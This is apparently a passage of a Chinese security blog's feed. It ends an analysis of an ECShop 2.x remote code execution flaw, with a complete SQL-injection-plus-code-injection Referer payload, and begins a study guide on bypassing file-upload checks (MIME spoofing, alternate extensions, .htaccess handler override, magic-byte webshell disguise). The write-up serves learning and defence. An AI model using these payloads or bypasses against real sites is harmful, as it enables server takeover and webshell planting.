class="line">    &#123;</span><br><span class="line">        $out = <span class="keyword">$this</span>-&gt;_eval(<span class="keyword">$this</span>-&gt;fetch_str(substr($filename, <span class="number">4</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于<code>$position_style</code>拼接了<code>str:</code>所以条件为真，进而执行危险函数<code>$_eval()</code> 我们先看一下<code>$fetch_str()</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch_str</span><span class="params">($source)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!defined(<span class="string">'ECS_ADMIN'</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        $source = <span class="keyword">$this</span>-&gt;smarty_prefilter_preCompile($source);</span><br><span class="line">    &#125;</span><br><span class="line">    $source=preg_replace(<span class="string">"/([^a-zA-Z0-9_]&#123;1,1&#125;)+(copy|fputs|fopen|file_put_contents|fwrite|eval|phpinfo)+( |\()/is"</span>, <span class="string">""</span>, $source);</span><br><span class="line">    <span class="keyword">if</span>(preg_match_all(<span class="string">'~(&lt;\?(?:\w+|=)?|\?&gt;|language\s*=\s*[\"\']?php[\"\']?)~is'</span>, $source, $sp_match))</span><br><span class="line">    &#123;</span><br><span class="line">        $sp_match[<span class="number">1</span>] = array_unique($sp_match[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span> ($curr_sp = <span class="number">0</span>, $for_max2 = count($sp_match[<span class="number">1</span>]); $curr_sp &lt; $for_max2; $curr_sp++)</span><br><span class="line">        &#123;</span><br><span class="line">            $source = str_replace($sp_match[<span class="number">1</span>][$curr_sp],<span class="string">'%%%SMARTYSP'</span>.$curr_sp.<span class="string">'%%%'</span>,$source);</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">for</span> ($curr_sp = <span class="number">0</span>, $for_max2 = count($sp_match[<span class="number">1</span>]); $curr_sp &lt; $for_max2; $curr_sp++)</span><br><span class="line">        &#123;</span><br><span class="line">             $source= str_replace(<span class="string">'%%%SMARTYSP'</span>.$curr_sp.<span class="string">'%%%'</span>, <span class="string">'&lt;?php echo \''</span>.str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, $sp_match[<span class="number">1</span>][$curr_sp]).<span class="string">'\'; ?&gt;'</span>.<span class="string">"\n"</span>, $source);</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> preg_replace(<span class="string">"/&#123;([^\&#125;\&#123;\n]*)&#125;/e"</span>, <span class="string">"\$this-&gt;select('\\1');"</span>, $source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其第一个正则会将一下关键字去除，重要的是最后一个正则：<code>preg_replace(&quot;/{([^\}\{\n]*)}/e&quot;, &quot;\$this-&gt;select(&#39;\\1&#39;);&quot;, $source);</code></p><p>该处<code>preg_replace</code>使用了<code>/e</code>,会导致命令执行，相当于 <strong>eval(‘$this-&gt;select(“\1”);’)</strong> 结果，当中的 <strong>\1</strong> 实际上就是 <strong>\1</strong> ，而 <strong>\1</strong> 在正则表达式中有自己的含义。我们来看看 <a href="https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html" target="_blank" rel="noopener"><strong>W3Cschool</strong></a> 中对其的描述：</p><blockquote><p><strong>反向引用</strong> </p><p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p></blockquote><p>所以这里的 <strong>\1</strong> 实际上指定的是第一个子匹配项。例如， <code>$source</code> 的值是 <code>xxx{$abc}xxx</code> ，正则捕获到的 <code>group 1</code> 就是 <code>$abc</code> ，然后就会调用 <code>$this-&gt;select(&quot;$abc&quot;)</code> 。</p><p>再来看一下<code>select()</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($tag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $tag = stripslashes(trim($tag));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($tag))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&#123;&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($tag&#123;<span class="number">0</span>&#125; == <span class="string">'*'</span> &amp;&amp; substr($tag, <span class="number">-1</span>) == <span class="string">'*'</span>) <span class="comment">// 注释部分</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($tag&#123;<span class="number">0</span>&#125; == <span class="string">'$'</span>) <span class="comment">// 变量</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">//           if(strpos($tag,"'") || strpos($tag,"]"))</span></span><br><span class="line"><span class="comment">//           &#123;</span></span><br><span class="line"><span class="comment">//                return '';</span></span><br><span class="line"><span class="comment">//           &#125;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;?php echo '</span> . <span class="keyword">$this</span>-&gt;get_val(substr($tag, <span class="number">1</span>)) . <span class="string">'; ?&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>当传入的变量的第一个字符是 <code>$</code> 时，会返回由 php 标签包含变量的字符串，最终返回到 <code>_eval()</code> 危险函数内执行。在返回之前，还调用了 <code>$this-&gt;get_var</code> 处理，跟进 <code>get_var</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_val</span><span class="params">($val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strrpos($val, <span class="string">'['</span>) !== <span class="keyword">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $val = preg_replace(<span class="string">"/\[([^\[\]]*)\]/eis"</span>, <span class="string">"'.'.str_replace('$','\$','\\1')"</span>, $val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (strrpos($val, <span class="string">'|'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $moddb = explode(<span class="string">'|'</span>, $val);</span><br><span class="line">        $val = array_shift($moddb);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($val))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (strpos($val, <span class="string">'.$'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $all = explode(<span class="string">'.$'</span>, $val);</span><br><span class="line">        <span class="keyword">foreach</span> ($all <span class="keyword">AS</span> $key =&gt; $val)</span><br><span class="line">        &#123;</span><br><span class="line">            $all[$key] = $key == <span class="number">0</span> ? <span class="keyword">$this</span>-&gt;make_var($val) : <span class="string">'['</span>. <span class="keyword">$this</span>-&gt;make_var($val) . <span class="string">']'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $p = implode(<span class="string">''</span>, $all);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $p = <span class="keyword">$this</span>-&gt;make_var($val);</span><br><span class="line">    &#125;</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure><p>当<code>$val</code>中不包含<code>.$</code>时会调用<code>$this-&gt;make_var()</code>继续跟进：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_var</span><span class="params">($val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strrpos($val, <span class="string">'.'</span>) === <span class="keyword">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_var[$val]) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_patchstack[$val]))</span><br><span class="line">        &#123;</span><br><span class="line">            $val = <span class="keyword">$this</span>-&gt;_patchstack[$val];</span><br><span class="line">        &#125;</span><br><span class="line">        $p = <span class="string">'$this-&gt;_var[\''</span> . $val . <span class="string">'\']'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $t = explode(<span class="string">'.'</span>, $val);</span><br><span class="line">        $_var_name = array_shift($t);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_var[$_var_name]) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_patchstack[$_var_name]))</span><br><span class="line">        &#123;</span><br><span class="line">            $_var_name = <span class="keyword">$this</span>-&gt;_patchstack[$_var_name];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($_var_name == <span class="string">'smarty'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">             $p = <span class="keyword">$this</span>-&gt;_compile_smarty_ref($t);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $p = <span class="string">'$this-&gt;_var[\''</span> . $_var_name . <span class="string">'\']'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> ($t <span class="keyword">AS</span> $val)</span><br><span class="line">        &#123;</span><br><span class="line">            $p.= <span class="string">'[\''</span> . $val . <span class="string">'\']'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里结合 <code>select</code> 函数里面的语句来看， <code>&lt;?php echo $this-&gt;_var[&#39; $val &#39;];?&gt;</code> ，要成功执行代码的话， <code>$val</code> 必须要把 <code>[&#39;</code> 闭合，所以payload构造，从下往上构造。 <code>$val</code> 为 <code>abc&#39;];echo phpinfo();//；</code> 从 <code>select</code> 函数进入 <code>get_var</code> 的条件是第一个字符是 <code>$</code> ，所以payload变成了 <code>$abc&#39;];echo phpinfo();//；</code> 而要进入到 <code>select</code> ，需要被捕获，payload变成了 <code>{$abc&#39;];echo phpinfo();//}</code> ，这里因为payload的是 <code>phpinfo()</code> ，这里会被 <code>fetch_str</code> 函数的第一个正则匹配到，需要变换一下，所以payload变为 <code>{$abc&#39;];echo phpinfo/**/();//}</code> 。</p><p>结合之前的SQL注入漏洞，最终执行恶意代码的payload为：</p><p><code>Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&#39; /*&quot;;}554fcae493e564ee0dc75bdf2ebf94ca</code></p><p><img src="https://s1.ax1x.com/2018/10/27/icZ38g.png" alt=""></p><p>这里可以利用<code>assert()</code>之类的函数写入shell。</p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p>1.<a href="http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">ecshop2.x代码执行</a></p><p>2.<a href="https://xz.aliyun.com/t/2725" target="_blank" rel="noopener">关于ECShop前台注入和getshell漏洞的一些思考</a></p><p>3.<a href="https://bbs.ichunqiu.com/thread-46029-1-1.html?from=snew" target="_blank" rel="noopener">ECShop全系列版本远程代码执行高危漏洞分析+实战提权</a></p><p>4.<a href="https://mochazz.github.io/2018/08/13/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6preg_replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">深入研究preg_replace与代码执行</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞学习总结</title>
      <link href="/writing/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
      <url>/writing/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>文件上传漏洞是渗透测试中一个关键的突破口，通过文件上传漏洞我们可以上传<code>webshell</code>等一系列操作。下面是有关文件上传漏洞的学习总结。</p><h2 id="0x01-文件上传检测流程"><a href="#0x01-文件上传检测流程" class="headerlink" title="0x01 文件上传检测流程"></a>0x01 文件上传检测流程</h2><p>通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据。一般文件上传过程中将会经过如下几个检测步骤：</p><ul><li>客户端 javascript 检测 (通常为检测文件扩展名)</li><li>服务端 MIME 类型检测 (检测 Content-Type 内容)</li><li>服务端目录路径检测 (检测跟 path 参数相关的内容)</li><li>服务端文件扩展名检测 (检测跟文件 extension 相关的内容)</li><li>服务端文件内容检测 (检测内容是否合法或含有恶意代码)</li></ul><h4 id="1-客户端-javascript-检测绕过"><a href="#1-客户端-javascript-检测绕过" class="headerlink" title="1. 客户端 javascript 检测绕过"></a>1. 客户端 javascript 检测绕过</h4><p>一般的文件上传界面都会有一段<code>javascript</code>代码来检测文件后缀名是否合法。</p><p>例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> filename=<span class="built_in">document</span>.getElementById(<span class="string">"file"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> str=filename.value.split(<span class="string">"."</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> ext=str[str.length<span class="number">-1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(ext==<span class="string">'jpg'</span>||ext==<span class="string">'png'</span>||ext==<span class="string">'jpeg'</span>||ext==<span class="string">'gif'</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">            alert(<span class="string">"这不是图片！"</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>绕过方法：</p><ul><li>利用浏览器的调试器把该<code>js</code>代码禁用或者删除</li><li>将文件扩展名改成合法的扩展名，利用burp抓包进行更改</li></ul><h4 id="2-服务端MIME检测绕过"><a href="#2-服务端MIME检测绕过" class="headerlink" title="2. 服务端MIME检测绕过"></a>2. 服务端MIME检测绕过</h4><p>HTTP协议规定了上传资源的时候在header中加入一项文件的<code>MIMETYPE</code>，来识别文件类型，这个动作是由浏览器完成的。</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'userfile'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>) &#123; <span class="comment">//检测Content-type</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$uploaddir = <span class="string">'uploads/'</span>;</span><br><span class="line">$uploadfile = $uploaddir . basename($_FILES[<span class="string">'userfile'</span>][<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>], $uploadfile)) &#123; <span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>绕过方法：</p><p>利用<code>burpsuite</code>修改header中的<code>Content-Type</code>字段，例如面对这样的代码时，如果我们需要上传PHP文件，我们可以将<code>header</code>中的<code>Content-Type: application/php</code>改为<code>Content-Type: image/gif</code></p><p>常见的MIMETYPE表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">text&#x2F;plain（纯文本）</span><br><span class="line"></span><br><span class="line">text&#x2F;html（HTML文档）</span><br><span class="line"></span><br><span class="line">text&#x2F;javascript（js代码）</span><br><span class="line"></span><br><span class="line">application&#x2F;xhtml+xml（XHTML文档）</span><br><span class="line"></span><br><span class="line">image&#x2F;gif（GIF图像）</span><br><span class="line"></span><br><span class="line">image&#x2F;jpeg（JPEG图像）</span><br><span class="line"></span><br><span class="line">image&#x2F;png（PNG图像）</span><br><span class="line"></span><br><span class="line">video&#x2F;mpeg（MPEG动画）</span><br><span class="line"></span><br><span class="line">application&#x2F;octet-stream（二进制数据）</span><br><span class="line"></span><br><span class="line">application&#x2F;pdf（PDF文档）</span><br><span class="line"></span><br><span class="line">application&#x2F;(编程语言) 该种语言的代码</span><br><span class="line"></span><br><span class="line">application&#x2F;msword（Microsoft Word文件）</span><br><span class="line"></span><br><span class="line">message&#x2F;rfc822（RFC 822形式）</span><br><span class="line"></span><br><span class="line">multipart&#x2F;alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示）</span><br><span class="line"></span><br><span class="line">application&#x2F;x-www-form-urlencoded（POST方法提交的表单）</span><br><span class="line"></span><br><span class="line">multipart&#x2F;form-data（POST提交时伴随文件上传的表单）</span><br></pre></td></tr></table></figure><h4 id="3-服务端文件扩展名检测"><a href="#3-服务端文件扩展名检测" class="headerlink" title="3. 服务端文件扩展名检测"></a>3. 服务端文件扩展名检测</h4><p>顾名思义，就是在文件被上传到服务端的时候，对于文件名的扩展名进行检查，如果不合法，则拒绝这次上传</p><p>在这里，还有一点是值得一提的，在检查扩展名是否合法的时候，有两种策略：</p><ul><li><p>黑名单策略，文件扩展名在黑名单中的即为不合法，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$postfix = end(explode(<span class="string">'.'</span>,<span class="string">'$_POST['</span>filename<span class="string">']);</span></span><br><span class="line"><span class="string">if($postfix=='</span>php<span class="string">'||$postfix=='</span>asp<span class="string">'||$postfix=='</span>sh<span class="string">')&#123;</span></span><br><span class="line"><span class="string">  echo "invalid file type";</span></span><br><span class="line"><span class="string">  return;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>绕过方式：</p><ul><li><p>文件名大小绕过</p></li><li><p>名单列表绕过：用黑名单中没有的扩展名进行攻击</p><p>常用于绕过的文件名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP: php2、php3、php5、phtml、pht</span><br><span class="line"></span><br><span class="line">ASP: aspx、ascx、ashx、cer、asa</span><br><span class="line"></span><br><span class="line">JSP: jspx</span><br></pre></td></tr></table></figure></li><li><p>特殊文件名绕过</p><p>比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格 )，这种命名方式 </p><p>在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会 被 windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性。</p></li><li><p>0x00截断绕过</p></li><li><p>.htaccess文件绕过</p><p>如果我们可以上传<code>.htaccess</code>文件的话，我们就可以建立一个<code>.htaccess</code>文件将指定的文件名以php的方式来解析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">"\.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$"</span>&gt;</span><br><span class="line"></span><br><span class="line">ForceType application/php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></li><li><p>解析调用/漏洞绕过</p></li></ul></li><li><p>白名单策略，文件扩展名不在白名单中的均为不合法，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$postfix = end(explode(<span class="string">'.'</span>,<span class="string">'$_POST['</span>filename<span class="string">']);</span></span><br><span class="line"><span class="string">if($postfix=='</span>jpg<span class="string">'||$postfix=='</span>png<span class="string">'||$postfix=='</span>gif<span class="string">')&#123;</span></span><br><span class="line"><span class="string">  //save the file and do something next</span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">  echo "invalid file type";</span></span><br><span class="line"><span class="string">  return;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>白名单相对于黑名单来说安全一些，但也不是绝对安全</p></li></ul><h4 id="4-服务端检测绕过（文件内容检测）"><a href="#4-服务端检测绕过（文件内容检测）" class="headerlink" title="4. 服务端检测绕过（文件内容检测）"></a>4. 服务端检测绕过（文件内容检测）</h4><p>如果文件内容检测设置的比较严格，那么文件上传攻击将变得非常困难，当然如果我们突破了这层检测，就代表我们突破了代码层检测的最后一道防线。</p><ul><li><p>文件幻数检测</p><p>图片文件通常有称作幻数的头字节，常见的图片文件的幻数如下：</p><p>JPG</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FF D8 FF E0 00 10 4A 46 49 46</span><br></pre></td></tr></table></figure><p>GIF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">47 49 46 38 29 61   &#x3D;&gt; GIF89a</span><br></pre></td></tr></table></figure><p>PNG</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">89 50 4E 47</span><br></pre></td></tr></table></figure><p>我们可以在文件幻数后面加上自己的一句话木马来绕过文件幻数检测。</p></li><li><p>文件相关信息检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检查是否图片</span></span><br><span class="line"><span class="keyword">if</span>(function_exists(<span class="string">'getimagesize'</span>)) &#123;</span><br><span class="line">    $tmp_imagesize = @getimagesize($new_name);</span><br><span class="line">    <span class="keyword">list</span>($tmp_width, $tmp_height, $tmp_type) = (<span class="keyword">array</span>)$tmp_imagesize;</span><br><span class="line">    $tmp_size = $tmp_width * $tmp_height;</span><br><span class="line">    <span class="keyword">if</span>($tmp_size &gt; <span class="number">16777216</span> || $tmp_size &lt; <span class="number">4</span> || <span class="keyword">empty</span>($tmp_type) || strpos($tmp_imagesize[<span class="string">'mime'</span>], <span class="string">'flash'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        @unlink($new_name);</span><br><span class="line">        <span class="keyword">return</span> cplang(<span class="string">'only_allows_upload_file_types'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>  图像文件相关信息检测常用的就是 getimagesize()函数 只需要把文件头部分伪造好就 ok 了，就是在幻数的基础上还加了一些文件信息 有点像下面的结构 </p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"> (...some binary data for image...) </span><br><span class="line"> &lt;?php phpinfo(); ?&gt;</span><br><span class="line"> (... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure><h2 